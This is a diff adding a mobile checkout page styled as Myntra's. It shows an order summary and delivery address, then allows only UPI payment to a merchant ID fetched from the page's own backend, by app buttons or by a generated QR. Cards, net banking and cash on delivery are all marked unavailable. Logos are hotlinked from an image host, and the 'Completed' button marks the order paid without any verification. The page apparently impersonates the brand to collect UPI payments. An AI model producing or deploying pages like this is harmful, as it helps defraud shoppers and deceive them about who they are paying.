@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Payment | Myntra</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f0f0f0;padding-bottom:100px;}
+.header{position:fixed;top:0;left:0;right:0;z-index:100;background:#fff;height:56px;display:flex;align-items:center;justify-content:space-between;padding:0 14px;box-shadow:0 1px 4px rgba(0,0,0,0.08);}
+.hl{display:flex;align-items:center;gap:10px;}
+.back{font-size:22px;color:#282c3f;text-decoration:none;line-height:1;}
+.header h2{font-size:16px;font-weight:700;color:#282c3f;}
+.step{font-size:13px;color:#535665;}
+.pbar{margin-top:56px;background:#fff;padding:12px 14px;display:flex;align-items:center;justify-content:space-between;border-bottom:2px solid #f0f0f0;}
+.pbar .lbl{font-size:13px;color:#535665;}
+.pbar .amt{font-size:18px;font-weight:700;color:#282c3f;}
+.osum{background:#fff;margin:10px 0;padding:14px;}
+.stitle{font-size:13px;font-weight:700;color:#535665;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:12px;}
+.oitem{display:flex;gap:12px;align-items:center;}
+.oimg{width:60px;height:70px;object-fit:cover;border-radius:4px;}
+.obrand{font-size:13px;font-weight:700;color:#282c3f;}
+.oname{font-size:12px;color:#535665;margin:2px 0;}
+.oprice{font-size:14px;font-weight:700;color:#282c3f;}
+.addrsec{background:#fff;margin:10px 0;padding:14px;}
+.atitle{font-size:13px;font-weight:700;color:#535665;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:10px;}
+.aname{font-size:14px;font-weight:700;color:#282c3f;}
+.adetail{font-size:13px;color:#535665;margin-top:4px;line-height:1.5;}
+.chgbtn{font-size:13px;color:#ff3f6c;font-weight:600;margin-top:8px;cursor:pointer;background:none;border:none;padding:0;display:flex;align-items:center;gap:4px;}
+
+/* PAYMENT SECTION */
+.pay-section{background:#fff;margin:10px 0;}
+.pay-hdr{padding:14px;border-bottom:1px solid #f0f0f0;font-size:13px;font-weight:700;color:#535665;text-transform:uppercase;letter-spacing:0.5px;}
+
+/* UPI — active */
+.upi-option{padding:14px;border-bottom:1px solid #f0f0f0;}
+.upi-title{display:flex;align-items:center;gap:10px;margin-bottom:14px;}
+.upi-radio{width:20px;height:20px;border:2px solid #ff3f6c;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.upi-radio::after{content:'';width:11px;height:11px;background:#ff3f6c;border-radius:50%;}
+.upi-label{font-size:14px;font-weight:700;color:#282c3f;}
+/* UPI App buttons */
+.upi-apps{display:flex;flex-direction:column;gap:10px;margin-bottom:14px;}
+.upi-app-btn{width:100%;display:flex;flex-direction:row;align-items:center;gap:14px;padding:12px 16px;border:1.5px solid #eee;border-radius:10px;cursor:pointer;background:#fafafa;transition:border-color 0.2s;font-size:14px;font-weight:600;color:#282c3f;text-align:left;}
+.upi-app-btn:hover,.upi-app-btn.active{border-color:#ff3f6c;background:#fff5f7;}
+.upi-app-btn .icon-box{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#fff;}
+/* Divider */
+.or-divider{display:flex;align-items:center;gap:10px;margin:12px 0;font-size:12px;color:#94969f;}
+.or-divider::before,.or-divider::after{content:'';flex:1;border-top:1px solid #eee;}
+/* UPI ID input */
+.upi-input{display:flex;align-items:center;border:1.5px solid #ddd;border-radius:8px;overflow:hidden;margin-bottom:8px;}
+.upi-input input{flex:1;padding:13px;border:none;outline:none;font-size:14px;color:#282c3f;}
+.upi-input input::placeholder{color:#94969f;}
+.upi-input input:focus{border:none;outline:none;}
+.upi-verify{padding:13px 16px;background:#ff3f6c;border:none;color:#fff;font-size:13px;font-weight:700;cursor:pointer;white-space:nowrap;}
+.upi-hint{font-size:11px;color:#94969f;display:flex;align-items:center;gap:4px;}
+
+/* Grayed out options */
+.disabled-option{padding:14px;border-bottom:1px solid #f0f0f0;display:flex;align-items:center;gap:12px;opacity:0.38;pointer-events:none;}
+.dis-radio{width:20px;height:20px;border:2px solid #ddd;border-radius:50%;flex-shrink:0;}
+.dis-label{font-size:14px;color:#282c3f;font-weight:500;display:flex;align-items:center;gap:8px;}
+.dis-sub{font-size:12px;color:#535665;margin-top:2px;}
+.dis-tag{font-size:10px;background:#eee;color:#535665;padding:2px 6px;border-radius:4px;margin-left:6px;}
+
+.security{background:#fff;margin:10px 0;padding:14px;text-align:center;}
+.security-inner{display:flex;align-items:center;justify-content:center;gap:8px;font-size:12px;color:#535665;}
+
+.bbar{position:fixed;bottom:0;left:0;right:0;background:#fff;padding:12px 14px;box-shadow:0 -2px 8px rgba(0,0,0,0.08);}
+.pay-btn{width:100%;padding:16px;background:#ff3f6c;border:none;border-radius:8px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;}
+.pay-btn:disabled{background:#ccc;cursor:not-allowed;}
+
+.processing{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:200;align-items:center;justify-content:center;flex-direction:column;gap:16px;color:#fff;text-align:center;}
+.processing.show{display:flex;}
+.spinner{width:48px;height:48px;border:4px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg);}}
+
+/* ─── QR Modal ──────────────────────────────────────────────────────────── */
+.qr-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.55);z-index:300;align-items:flex-end;justify-content:center;}
+.qr-overlay.show{display:flex;}
+.qr-box{background:#fff;border-radius:20px 20px 0 0;padding:20px 20px 32px;width:100%;max-width:480px;text-align:center;}
+.qr-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;}
+.qr-header h3{font-size:16px;font-weight:700;color:#282c3f;}
+.qr-close{background:none;border:none;font-size:22px;color:#94969f;cursor:pointer;line-height:1;padding:4px;}
+.qr-sub{font-size:12px;color:#94969f;margin-bottom:16px;}
+.qr-amount-label{font-size:12px;color:#535665;margin-bottom:4px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;}
+.qr-amount{font-size:32px;font-weight:800;color:#282c3f;margin-bottom:16px;}
+.qr-img-wrap{width:220px;height:220px;margin:0 auto 14px;border-radius:12px;overflow:hidden;border:1px solid #f0f0f0;background:#fafafa;display:flex;align-items:center;justify-content:center;}
+.qr-img-wrap img{width:100%;height:100%;object-fit:contain;}
+.qr-upi-row{display:flex;align-items:center;justify-content:center;gap:6px;font-size:13px;color:#535665;margin-bottom:6px;}
+.qr-upi-id{font-weight:700;color:#282c3f;}
+.qr-note{font-size:12px;color:#03a685;margin-bottom:14px;display:flex;align-items:center;justify-content:center;gap:5px;}
+.qr-apps{display:flex;gap:14px;justify-content:center;margin-bottom:20px;}
+.qr-apps img{width:34px;height:34px;object-fit:contain;border-radius:8px;border:1px solid #f0f0f0;}
+.qr-paid-btn{width:100%;padding:16px;background:#282c3f;border:none;border-radius:10px;color:#fff;font-size:15px;font-weight:700;cursor:pointer;}
+.qr-loading{font-size:13px;color:#94969f;margin:20px 0;}
+
+/* Price breakdown (same as bag.html) */
+.psec{padding:14px;border-top:1px solid #f0f0f0;}
+.ptitle{font-size:13px;font-weight:700;color:#282c3f;margin-bottom:14px;}
+.prow2{display:flex;justify-content:space-between;margin-bottom:12px;font-size:14px;color:#282c3f;align-items:center;}
+.prow2 .g{color:#03a685;font-weight:600;}
+.prow2 .fr{color:#03a685;font-weight:600;}
+.pdiv{border:none;border-top:1px solid #f0f0f0;margin:12px 0;}
+.ptot{display:flex;justify-content:space-between;font-size:15px;font-weight:700;color:#282c3f;}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="hl"><a class="back" onclick="history.back()">&#8592;</a><h2>PAYMENT</h2></div>
+  <span class="step">STEP 3/3</span>
+</div>
+
+<div class="pbar">
+  <span class="lbl">Total Amount to Pay</span>
+  <span class="amt" id="totalAmt">&#8377;0</span>
+</div>
+
+<div class="osum">
+  <div class="stitle">Order Summary</div>
+  <div class="oitem">
+    <img class="oimg" id="oImg" src="" alt=""/>
+    <div><div class="obrand" id="oBrand"></div><div class="oname" id="oName"></div><div class="oprice" id="oPrice"></div></div>
+  </div>
+
+<div class="psec">
+  <div class="prow2"><span>Total MRP</span><span id="totMrp"></span></div>
+  <div class="prow2"><span>MRP After Discount</span><span class="g" id="afterDisc"></span></div>
+  <div class="prow2"><span>Platform Fee <span style="color:#ff3f6c;font-size:12px;cursor:pointer;">Know More</span></span><span>&#8377;23</span></div>
+  <div class="prow2"><span>Delivery Charges</span><span class="fr">FREE</span></div>
+  <hr class="pdiv"/>
+  <div class="ptot"><span>Total Amount</span><span id="totAmtBreakdown"></span></div>
+</div>
+</div>
+
+<div class="addrsec">
+  <div class="atitle">Delivering To</div>
+  <div class="aname" id="aName"></div>
+  <div class="adetail" id="aDetail"></div>
+  <button class="chgbtn" onclick="window.location.href='address.html'">
+    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#ff3f6c" stroke-width="2" stroke-linecap="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
+    Change Address
+  </button>
+</div>
+
+<div class="pay-section">
+  <div class="pay-hdr">Select Payment Method</div>
+
+  <!-- UPI (ACTIVE) -->
+  <div class="upi-option">
+    <div class="upi-title">
+      <div class="upi-radio"></div>
+      <span class="upi-label">UPI</span>
+    </div>
+
+    <!-- UPI App Buttons (user will replace icon boxes with real logos) -->
+    <div class="upi-apps">
+     <button class="upi-app-btn" onclick="triggerUPI('gpay')" id="btnGpay">
+      <img src="https://i.postimg.cc/BQQV2Mxq/Google-Pay-Logo-svg.png" style="width:40px;height:40px;border-radius:10px;object-fit:contain;"/>
+      GPay
+     </button>
+     <button class="upi-app-btn" onclick="triggerUPI('phonepe')" id="btnPhonepe">
+      <img src="https://i.postimg.cc/Bnj7VbYM/Phone-Pe-Logo-svg.png" style="width:40px;height:40px;border-radius:10px;object-fit:contain;"/>
+      PhonePe
+     </button>
+     <button class="upi-app-btn" onclick="triggerUPI('paytm')" id="btnPaytm">
+      <img src="https://i.postimg.cc/jjNgR9rS/Paytm-logo.png" style="width:40px;height:40px;border-radius:10px;object-fit:contain;"/>
+      Paytm
+     </button>
+     <button class="upi-app-btn" onclick="triggerUPI('bhim')" id="btnBhim">
+      <img src="https://i.postimg.cc/66zH6nFb/BHIM-logo-svg.png" style="width:40px;height:40px;border-radius:10px;object-fit:contain;"/>
+       BHIM
+     </button>
+	 <button class="upi-app-btn" onclick="showQR()">
+      <div class="icon-box" style="background:#282c3f;">
+       <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
+      </div>
+     Scan &amp; Pay
+     </button>
+    </div>
+  </div>
+
+  <!-- GRAYED OUT: Card -->
+  <div class="disabled-option">
+    <div class="dis-radio"></div>
+    <div>
+      <div class="dis-label">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#282c3f" stroke-width="2" stroke-linecap="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+        Credit / Debit Card
+        <span class="dis-tag">Currently Unavailable</span>
+      </div>
+      <div class="dis-sub">Visa, Mastercard, RuPay &amp; more</div>
+    </div>
+  </div>
+
+  <!-- GRAYED OUT: Net Banking -->
+  <div class="disabled-option">
+    <div class="dis-radio"></div>
+    <div>
+      <div class="dis-label">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#282c3f" stroke-width="2" stroke-linecap="round"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18M9 21V9"/></svg>
+        Net Banking
+        <span class="dis-tag">Currently Unavailable</span>
+      </div>
+      <div class="dis-sub">All major banks supported</div>
+    </div>
+  </div>
+
+  <!-- GRAYED OUT: COD -->
+  <div class="disabled-option">
+    <div class="dis-radio"></div>
+    <div>
+      <div class="dis-label">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#282c3f" stroke-width="2" stroke-linecap="round"><path d="M12 1v22M17 5H9.5a3.5 3.5 0 1 0 0 7h5a3.5 3.5 0 1 1 0 7H6"/></svg>
+        Cash on Delivery
+        <span class="dis-tag">Not Available</span>
+      </div>
+      <div class="dis-sub">Not available for this order</div>
+    </div>
+  </div>
+</div>
+
+<div class="security">
+  <div class="security-inner">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#03a685" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+    100% Secure Payments — All transactions are encrypted
+  </div>
+</div>
+
+<div class="bbar">
+  <button class="pay-btn" id="payBtn" onclick="makePayment()">PAY NOW &#8594;</button>
+</div>
+
+<!-- QR Modal -->
+<div class="qr-overlay" id="qrModal">
+  <div class="qr-box">
+    <div class="qr-header">
+      <h3>Scan &amp; Pay</h3>
+      <button class="qr-close" onclick="closeQR()">&#x2715;</button>
+    </div>
+    <div class="qr-sub">Scan with any UPI app to pay</div>
+    <div class="qr-amount-label">Amount to Pay</div>
+    <div class="qr-amount">&#8377;<span id="qrAmt"></span></div>
+    <div class="qr-img-wrap">
+      <img id="qrImage" src="" alt="UPI QR Code"/>
+    </div>
+	<div class="qr-upi-row">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#535665" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      <span class="qr-upi-id" id="qrUpiId"></span>
+    </div>
+    <div class="qr-note">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#03a685" stroke-width="2" stroke-linecap="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12" y2="18"/></svg>
+      Scan this QR in your UPI app
+    </div>
+    <div class="qr-apps">
+      <img src="https://i.postimg.cc/BQQV2Mxq/Google-Pay-Logo-svg.png" alt="GPay" title="GPay"/>
+      <img src="https://i.postimg.cc/Bnj7VbYM/Phone-Pe-Logo-svg.png" alt="PhonePe" title="PhonePe"/>
+      <img src="https://i.postimg.cc/jjNgR9rS/Paytm-logo.png" alt="Paytm" title="Paytm"/>
+      <img src="https://i.postimg.cc/66zH6nFb/BHIM-logo-svg.png" alt="BHIM" title="BHIM"/>
+    </div>
+    <button class="qr-paid-btn" onclick="handleQRPaid()">Completed</button>
+  </div>
+</div>
+
+<div class="processing" id="processing">
+  <div class="spinner"></div>
+  <p style="font-size:16px;font-weight:600;">Processing Payment...</p>
+  <p style="font-size:13px;opacity:0.8;">Please do not press back</p>
+</div>
+
+<script>
+// ─── Page data from localStorage ──────────────────────────────────────────
+const pro   = JSON.parse(localStorage.getItem("orderProduct") || localStorage.getItem("buyNowProduct") || "{}");
+const total = localStorage.getItem("orderTotal") || (Math.ceil((pro.oldprice||0)*(100-(pro.discount||0))/100) + 23);
+const addr  = JSON.parse(localStorage.getItem("savedAddress") || "{}");
+
+document.getElementById("totalAmt").textContent = "₹" + total;
+document.getElementById("oImg").src   = pro.img || "";
+document.getElementById("oBrand").textContent = pro.brand_name || "";
+document.getElementById("oName").textContent  = pro.T_shirt_name || "";
+const price = Math.ceil((pro.oldprice||0)*(100-(pro.discount||0))/100);
+document.getElementById("oPrice").textContent          = "₹" + price;
+document.getElementById("totMrp").textContent          = "₹" + (pro.oldprice || 0);
+document.getElementById("afterDisc").textContent       = "₹" + price;
+document.getElementById("totAmtBreakdown").textContent = "₹" + total;
+
+if (addr.name) {
+  document.getElementById("aName").textContent   = addr.name + " — " + addr.mobile;
+  document.getElementById("aDetail").textContent = addr.house + ", " + addr.address + ", " + addr.locality + ", " + addr.city + ", " + addr.state + " — " + addr.pincode;
+}
+
+// ─── State ────────────────────────────────────────────────────────────────
+let paytmJsLoaded = false;
+let selectedApp   = null;
+
+// ─── Highlight the tapped UPI button ─────────────────────────────────────
+function triggerUPI(app) {
+  selectedApp = app;
+  document.querySelectorAll(".upi-app-btn").forEach(b => b.classList.remove("active"));
+  const btn = document.getElementById("btn" + app.charAt(0).toUpperCase() + app.slice(1));
+  if (btn) btn.classList.add("active");
+  openCheckout();
+}
+
+// Scan & Pay — fetches merchant UPI from backend, generates QR with exact amount
+async function showQR() {
+  selectedApp = "qr";
+  document.querySelectorAll(".upi-app-btn").forEach(b => b.classList.remove("active"));
+
+  // Show modal with loading state first
+  document.getElementById("qrAmt").textContent = total;
+  document.getElementById("qrUpiId").textContent = "Loading...";
+  document.getElementById("qrImage").src = "";
+  document.getElementById("qrModal").classList.add("show");
+
+  try {
+    // Get merchant UPI ID from backend (it's stored in your .env)
+    const res = await fetch("/api/merchant-info");
+    if (!res.ok) throw new Error("Could not fetch merchant info");
+    const { upiId, name } = await res.json();
+
+    // Build the UPI payment link — amount is baked in so every product shows a different QR
+    const upiLink = `upi://pay?pa=${encodeURIComponent(upiId)}&am=${parseFloat(total).toFixed(2)}&cu=INR&tn=Watch+Order`;
+
+    // Generate QR code image using a free public API (no library needed)
+    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=${encodeURIComponent(upiLink)}&bgcolor=ffffff&color=000000&qzone=1&format=png`;
+
+    document.getElementById("qrImage").src = qrUrl;
+    document.getElementById("qrUpiId").textContent = upiId;
+
+  } catch (err) {
+    console.error("[showQR]", err);
+    document.getElementById("qrUpiId").textContent = "If any error in loading QR, Try again.";
+  }
+}
+
+function closeQR() {
+  document.getElementById("qrModal").classList.remove("show");
+}
+
+// When user taps "I Have Paid" after scanning the QR
+function handleQRPaid() {
+  closeQR();
+  // Save order data for success page
+  const orderData = {
+    product      : pro,
+    address      : addr,
+    total,
+    paymentMethod: "UPI QR (Scan & Pay)",
+    orderId      : "MYN" + Date.now().toString().slice(-8),
+    orderDate    : new Date().toLocaleDateString("en-IN", { day: "numeric", month: "long", year: "numeric" })
+  };
+  localStorage.setItem("completedOrder", JSON.stringify(orderData));
+  // Show processing spinner briefly then redirect
+  document.getElementById("processing").classList.add("show");
+  setTimeout(() => window.location.href = "success.html", 1500);
+}
+
+// PAY NOW button at bottom
+function makePayment() {
+  openCheckout();
+}
+
+// ─── Main: create order → load Paytm JS → open checkout modal ────────────
+async function openCheckout() {
+  const payBtn = document.getElementById("payBtn");
+  payBtn.textContent = "Setting up payment...";
+  payBtn.disabled = true;
+
+  try {
+    // Step 1 — Ask our backend to create an order with Paytm
+    const res = await fetch("/api/create-order", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        amount    : total,
+        customerId: addr.mobile || "GUEST_" + Date.now()
+      })
+    });
+
+    if (!res.ok) {
+      const err = await res.json();
+      throw new Error(err.error || "Server error");
+    }
+
+    const { orderId, txnToken, mid, amount, paytmHost } = await res.json();
+
+    // Step 2 — Load Paytm CheckoutJS once (cached for subsequent clicks)
+    if (!paytmJsLoaded) {
+      await new Promise((resolve, reject) => {
+        const s   = document.createElement("script");
+        s.src     = `${paytmHost}/merchantpgpui/checkoutjs/merchants/${mid}.js`;
+        s.crossOrigin = "anonymous";
+        s.onload  = () => { paytmJsLoaded = true; resolve(); };
+        s.onerror = () => reject(new Error("Failed to load Paytm checkout. Check your MID."));
+        document.head.appendChild(s);
+      });
+    }
+
+    // Step 3 — Configure and open the Paytm payment modal
+    //   The modal shows UPI apps installed on the device (GPay, PhonePe, etc.),
+    //   cards, net banking — Paytm handles everything internally.
+    const config = {
+      root    : "",
+      flow    : "DEFAULT",
+      merchant: { mid, redirect: false },
+      data    : {
+        orderId,
+        token    : txnToken,
+        tokenType: "TXN_TOKEN",
+        amount   : String(amount),
+      },
+      handler: {
+        // Fires when Paytm modal reports a result (success/failure/pending)
+        transactionStatus(payStatus) {
+          if (payStatus.STATUS === "TXN_SUCCESS" || payStatus.STATUS === "PENDING") {
+            // PENDING can still become success when webhook arrives — poll anyway
+            pollPaymentStatus(orderId);
+          } else {
+            resetPayBtn();
+            alert("Payment was not completed. Please try again.");
+          }
+        },
+        // Fires when user closes the modal without paying
+        notifyMerchant(eventName) {
+          if (eventName === "APP_CLOSED") resetPayBtn();
+        }
+      }
+    };
+
+    window.Paytm.CheckoutJS.init(config)
+      .then(() => window.Paytm.CheckoutJS.invoke())
+      .catch(err => { throw err; });
+
+  } catch (err) {
+    console.error("[checkout]", err);
+    resetPayBtn();
+    alert("Could not start payment: " + err.message);
+  }
+}
+
+// ─── Poll backend until webhook confirms payment ──────────────────────────
+async function pollPaymentStatus(orderId) {
+  document.getElementById("processing").classList.add("show");
+
+  const MAX_ATTEMPTS = 12;   // 12 × 2.5s = 30 seconds max wait
+  let   attempts     = 0;
+
+  const poll = setInterval(async () => {
+    attempts++;
+    try {
+      const res  = await fetch(`/api/payment-status/${orderId}`);
+      const data = await res.json();
+
+      if (data.status === "paid") {
+        clearInterval(poll);
+        // Save for success page
+        const orderData = {
+          product      : pro,
+          address      : addr,
+          total,
+          paymentMethod: "UPI (Paytm Gateway)",
+          orderId,
+          txnId        : data.txnId,
+          orderDate    : new Date().toLocaleDateString("en-IN", {day:"numeric",month:"long",year:"numeric"})
+        };
+        localStorage.setItem("completedOrder", JSON.stringify(orderData));
+        window.location.href = "success.html";
+
+      } else if (data.status === "failed") {
+        clearInterval(poll);
+        document.getElementById("processing").classList.remove("show");
+        alert("Payment failed. Please try again.");
+        resetPayBtn();
+
+      } else if (attempts >= MAX_ATTEMPTS) {
+        clearInterval(poll);
+        document.getElementById("processing").classList.remove("show");
+        // Webhook may still arrive later — give user the order ID for support
+        alert(
+          `Payment is being verified.\n\nYour Order ID: ${orderId}\n\n` +
+          `If money was deducted, it will be refunded within 5-7 business days.`
+        );
+        resetPayBtn();
+      }
+    } catch (e) {
+      console.error("[poll]", e);
+    }
+  }, 2500);
+}
+
+function resetPayBtn() {
+  const btn = document.getElementById("payBtn");
+  btn.textContent = "PAY NOW →";
+  btn.disabled    = false;
+}
+</script>
+</body>
+</html>
